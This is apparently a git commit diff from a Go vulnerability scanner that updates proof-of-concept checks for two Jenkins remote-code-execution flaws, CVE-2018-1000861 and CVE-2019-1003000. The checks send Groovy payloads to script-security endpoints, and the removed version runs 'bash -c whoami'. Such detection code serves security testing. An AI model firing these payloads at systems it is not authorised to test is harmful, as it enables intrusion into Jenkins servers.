975994366649d09fb451d3de7850aff0be724658
veo <38176360+veo@users.noreply.github.com>
2021-08-08 19:27:25 +0800

    更新jenkins poc

--- poc/jenkins/CVE_2018_1000861.go
+++ poc/jenkins/CVE_2018_1000861.go
@@ -3,19 +3,20 @@ package jenkins
 import (
 	"fmt"
 	"github.com/veo/vscan/pkg"
+	"strings"
 )
 
 func CVE_2018_1000861(u string) bool {
 	if req, err := pkg.HttpRequset(u, "GET", "", false, nil); err == nil {
 		if req.Header.Get("X-Jenkins-Session") != "" {
-			if req2, err := pkg.HttpRequset(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22bash+-c+whoami%22)%7d)%0aclass+Person%7b%7d", "GET", "", false, nil); err == nil {
-				if req2.StatusCode == 200 {
+			if req2, err := pkg.HttpRequset(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22vtest%22)%7d)%0aclass+Person%7b%7d", "POST", "", false, nil); err == nil {
+				if req2.StatusCode == 500 && strings.Contains(req2.Body, "No such file or directory") {
 					fmt.Printf("jenkins-exp-sucess|CVE_2018_1000861|%s\n", u)
 					return true
 				}
 			}
-			if req3, err := pkg.HttpRequset(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+%22bash+-cwhoami%22.execute().text+%7d)%0aclass+Person%7b%7d", "GET", "", false, nil); err == nil {
-				if req3.StatusCode == 200 {
+			if req3, err := pkg.HttpRequset(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+%22vtest%22.execute().text+%7d)%0aclass+Person%7b%7d", "POST", "", false, nil); err == nil {
+				if req3.StatusCode == 500 && strings.Contains(req3.Body, "No such file or directory") {
 					fmt.Printf("jenkins-exp-sucess|CVE_2018_1000861|%s\n", u)
 					return true
 				}
--- poc/jenkins/CVE_2019_1003000.go
+++ poc/jenkins/CVE_2019_1003000.go
@@ -9,8 +9,8 @@ import (
 func CVE_2019_10003000(u string) bool {
 	if req, err := pkg.HttpRequset(u, "GET", "", false, nil); err == nil {
 		if req.Header.Get("X-Jenkins-Session") != "" {
-			if req2, err := pkg.HttpRequset(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vultestvultest%27,%20version=%271%27)%0aimport%20Payload;", "GET", "", false, nil); err == nil {
-				if strings.Contains(req2.Body, "package#vultestvultest") {
+			if req2, err := pkg.HttpRequset(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27vtest%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vtestvul%27,%20version=%271%27)%0aimport%20Vtest;", "GET", "", false, nil); err == nil {
+				if strings.Contains(req2.Body, "package#vtestvul") {
 					fmt.Printf("jenkins-exp-sucess|CVE_2019_10003000|%s\n", u)
 					return true
 				}
